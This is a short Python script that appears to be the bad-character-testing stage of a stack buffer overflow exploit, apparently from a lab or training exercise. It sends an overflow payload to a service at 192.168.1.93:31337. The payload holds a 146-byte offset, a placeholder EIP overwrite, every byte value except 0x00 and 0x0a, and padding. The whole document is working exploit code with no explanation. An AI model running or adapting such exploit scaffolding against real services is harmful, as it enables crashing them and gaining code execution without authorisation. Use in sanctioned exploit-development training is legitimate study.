import socket, struct

host, port = '192.168.1.93', 31337
newline = b'\n'
offset = 146
length = 1000
new_eip = b'BBBB'
bad_chars = [
b'\x00',
b'\x0a'
]

all_chars = bytearray(range(1,256))
for bad_char in bad_chars:
        all_chars = all_chars.replace(bad_char, b'')
payload = b''.join([
b'A'*offset,
new_eip,
all_chars,
b'C' * (length - offset - len(new_eip) - len(all_chars)),
newline,
])





with socket.socket() as s:
        s.connect((host,port))
        s.send(payload)
